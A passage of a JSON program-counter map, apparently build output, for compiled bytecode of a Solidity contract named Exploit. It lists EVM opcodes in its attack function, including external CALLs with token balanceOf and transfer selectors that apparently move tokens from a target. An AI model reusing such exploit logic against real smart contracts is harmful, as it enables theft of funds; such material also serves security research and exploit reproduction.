    "3062": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3064": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3066": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3068": {
      "op": "SHL"
    },
    "3069": {
      "op": "SUB"
    },
    "3070": {
      "fn": "Exploit.attack",
      "offset": [
        4424,
        4428
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "3071": {
      "fn": "Exploit.attack",
      "offset": [
        4424,
        4428
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3072": {
      "fn": "Exploit.attack",
      "offset": [
        4424,
        4428
      ],
      "op": "AND",
      "path": "0"
    },
    "3073": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "3075": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3076": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "ADD",
      "path": "0"
    },
    "3077": {
      "op": "MSTORE"
    },
    "3078": {
      "fn": "Exploit.attack",
      "offset": [
        4431,
        4439
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x32D26D12E980B600000"
    },
    "3089": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "3091": {
      "op": "DUP3"
    },
    "3092": {
      "op": "ADD"
    },
    "3093": {
      "op": "MSTORE"
    },
    "3094": {
      "fn": "Exploit.attack",
      "offset": [
        4449,
        4464
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3095": {
      "fn": "Exploit.attack",
      "offset": [
        4449,
        4464
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3096": {
      "fn": "Exploit.attack",
      "offset": [
        4449,
        4464
      ],
      "op": "AND",
      "path": "0"
    },
    "3097": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "3099": {
      "op": "DUP3"
    },
    "3100": {
      "op": "ADD"
    },
    "3101": {
      "op": "MSTORE"
    },
    "3102": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4404
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3103": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4404
      ],
      "op": "AND",
      "path": "0"
    },
    "3104": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4404
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "3105": {
      "op": "POP"
    },
    "3106": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4415
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1C4009F9"
    },
    "3111": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4415
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3112": {
      "op": "POP"
    },
    "3113": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "3115": {
      "op": "ADD"
    },
    "3116": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3118": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3120": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3121": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3122": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3123": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "SUB",
      "path": "0"
    },
    "3124": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3125": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3127": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "DUP8",
      "path": "0"
    },
    "3128": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3129": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "3130": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3131": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3132": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3133": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xC45"
    },
    "3136": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3137": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3139": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3140": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "REVERT",
      "path": "0"
    },
    "3141": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3142": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "POP",
      "path": "0"
    },
    "3143": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "GAS",
      "path": "0"
    },
    "3144": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "CALL",
      "path": "0"
    },
    "3145": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3146": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3147": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3148": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xC59"
    },
    "3151": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3152": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3153": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3155": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3156": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "3157": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3158": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3160": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "REVERT",
      "path": "0"
    },
    "3161": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3162": {
      "op": "POP"
    },
    "3163": {
      "op": "POP"
    },
    "3164": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4491
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 16,
      "value": "0x6"
    },
    "3166": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4491
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "3167": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3169": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3170": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "3175": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "3177": {
      "op": "SHL"
    },
    "3178": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3179": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3180": {
      "fn": "Exploit.attack",
      "offset": [
        4561,
        4565
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "3181": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "3183": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3184": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "ADD",
      "path": "0"
    },
    "3185": {
      "op": "MSTORE"
    },
    "3186": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3188": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3190": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3192": {
      "op": "SHL"
    },
    "3193": {
      "op": "SUB"
    },
    "3194": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4491
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3195": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4491
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3196": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4491
      ],
      "op": "AND",
      "path": "0"
    },
    "3197": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4491
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "3198": {
      "op": "POP"
    },
    "3199": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4500
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xA9059CBB"
    },
    "3204": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4500
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3205": {
      "op": "POP"
    },
    "3206": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4491
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3207": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4491
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3208": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4491
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3209": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4491
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3210": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4552
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "3215": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4552
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3216": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "3218": {
      "op": "ADD"
    },
    "3219": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "3221": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3223": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3224": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3225": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3226": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "SUB",
      "path": "0"
    },
    "3227": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3228": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "DUP7",
      "path": "0"
    },
    "3229": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "GAS",
      "path": "0"
    },
    "3230": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "3231": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3232": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3233": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3234": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xCAF"
    },
    "3237": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3238": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3239": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3241": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3242": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "3243": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3244": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3246": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "REVERT",
      "path": "0"
    },
    "3247": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3248": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "POP",
      "path": "0"
    },
    "3249": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "POP",
      "path": "0"
    },
    "3250": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "POP",
      "path": "0"
    },
    "3251": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "POP",
      "path": "0"
    },
    "3252": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3254": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3255": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3256": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "3258": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "NOT",
      "path": "0"
    },
    "3259": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "3261": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3262": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "ADD",
      "path": "0"
    },
    "3263": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "AND",
      "path": "0"
    },
    "3264": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3265": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "ADD",
      "path": "0"
    },
    "3266": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3267": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3269": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3270": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "POP",
      "path": "0"
    },
    "3271": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3272": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "ADD",
      "path": "0"
    },
    "3273": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3274": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xCD3"
    },
    "3277": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3278": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3279": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14C6"
    },
    "3282": {
      "fn": "Exploit.attack",
      "jump": "i",
      "offset": [
        4527,
        4567
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3283": {
      "fn": "Exploit.attack",
      "offset": [
        4527,
        4567
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3284": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3286": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3287": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3289": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3291": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "3293": {
      "op": "SHL"
    },
    "3294": {
      "op": "SUB"
    },
    "3295": {
      "op": "NOT"
    },
    "3296": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "3298": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "DUP6",
      "path": "0"
    },
    "3299": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3300": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "SHL",
      "path": "0"
    },
    "3301": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "AND",
      "path": "0"
    },
    "3302": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3303": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3304": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3306": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3308": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3310": {
      "op": "SHL"
    },
    "3311": {
      "op": "SUB"
    },
    "3312": {
      "op": "SWAP1"
    },
    "3313": {
      "op": "SWAP3"
    },
    "3314": {
      "op": "AND"
    },
    "3315": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "3317": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3318": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "ADD",
      "path": "0"
    },
    "3319": {
      "op": "MSTORE"
    },
    "3320": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "3322": {
      "op": "DUP3"
    },
    "3323": {
      "op": "ADD"
    },
    "3324": {
      "op": "MSTORE"
    },
    "3325": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "3327": {
      "op": "ADD"
    },
    "3328": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "3330": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3332": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3333": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3334": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3335": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "SUB",
      "path": "0"
    },
    "3336": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3337": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3339": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "DUP8",
      "path": "0"
    },
    "3340": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "GAS",
      "path": "0"
    },
    "3341": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "CALL",
      "path": "0"
    },
    "3342": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3343": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3344": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3345": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xD1E"
    },
    "3348": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3349": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3350": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3352": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3353": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "3354": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3355": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3357": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "REVERT",
      "path": "0"
    },
    "3358": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3359": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "POP",
      "path": "0"
    },
    "3360": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "POP",
      "path": "0"
    },
    "3361": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "POP",
      "path": "0"
    },
    "3362": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "POP",
      "path": "0"
    },
    "3363": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3365": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3366": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3367": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "3369": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "NOT",
      "path": "0"
    },
    "3370": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "3372": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3373": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "ADD",
      "path": "0"
    },
    "3374": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "AND",
      "path": "0"
    },
    "3375": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3376": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "ADD",
      "path": "0"
    },
    "3377": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3378": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3380": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3381": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "POP",
      "path": "0"
    },
    "3382": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3383": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "ADD",
      "path": "0"
    },
    "3384": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3385": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xD42"
    },
    "3388": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3389": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3390": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14DF"
    },
    "3393": {
      "fn": "Exploit.attack",
      "jump": "i",
      "offset": [
        4476,
        4568
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3394": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3395": {
      "fn": "Exploit.attack",
      "offset": [
        4476,
        4568
      ],
      "op": "POP",
      "path": "0"
    },
    "3396": {
      "fn": "Exploit.attack",
      "offset": [
        4636,
        4649
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3398": {
      "fn": "Exploit.attack",
      "offset": [
        4651,
        4664
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3399": {
      "fn": "Exploit.attack",
      "offset": [
        4683,
        4712
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x10"
    },
    "3401": {
      "fn": "Exploit.attack",
      "offset": [
        4683,
        4712
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3403": {
      "fn": "Exploit.attack",
      "offset": [
        4683,
        4712
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3404": {
      "fn": "Exploit.attack",
      "offset": [
        4683,
        4712
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "3405": {
      "fn": "Exploit.attack",
      "offset": [
        4683,
        4712
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3406": {
      "fn": "Exploit.attack",
      "offset": [
        4683,
        4712
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x100"
    },
    "3409": {
      "fn": "Exploit.attack",
      "offset": [
        4683,
        4712
      ],
      "op": "EXP",
      "path": "0"
    },
    "3410": {
      "fn": "Exploit.attack",
      "offset": [
        4683,
        4712
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3411": {
      "fn": "Exploit.attack",
      "offset": [
        4683,
        4712
      ],
      "op": "DIV",
      "path": "0"
    },
    "3412": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3414": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3416": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3418": {
      "op": "SHL"
    },
    "3419": {
      "op": "SUB"
    },
    "3420": {
      "fn": "Exploit.attack",
      "offset": [
        4683,
        4712
      ],
      "op": "AND",
      "path": "0"
    },
    "3421": {
